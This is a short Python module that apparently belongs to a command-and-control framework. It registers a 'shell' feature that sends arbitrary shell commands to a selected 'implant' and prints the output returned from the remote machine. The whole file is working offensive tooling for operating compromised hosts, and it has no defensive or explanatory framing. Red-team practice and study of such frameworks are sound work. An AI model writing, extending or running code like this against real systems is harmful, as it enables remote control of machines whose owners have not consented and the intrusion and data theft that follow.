from features import addFeature
import messages
from messages import OutgoingMessage

class ShellCommand():
  command = 'shell'

  def run(arguments, implant):
    if not implant:
      print('use implant first!')
    else:
      message = OutgoingMessage(ShellCommand.command, bytes(' '.join(arguments), 'ascii'))
      implant.queueOutgoingMessage(message)

  def help():
    return 'Execute shell commands. Usage: shell command'

  def incoming(data, implant):
    try:
      #data = str(data, 'utf-16-le') 
      data = str(data, 'utf-8') 

      #print('[+] Shell output from \'' + implant.name + '\':')
      print(data, end = '', flush=True)
      #print(data, end = '', flush=True)
    except:
      print('Received unencodable shell data from ' + implant.name + ': ' + data.hex())

addFeature(ShellCommand)
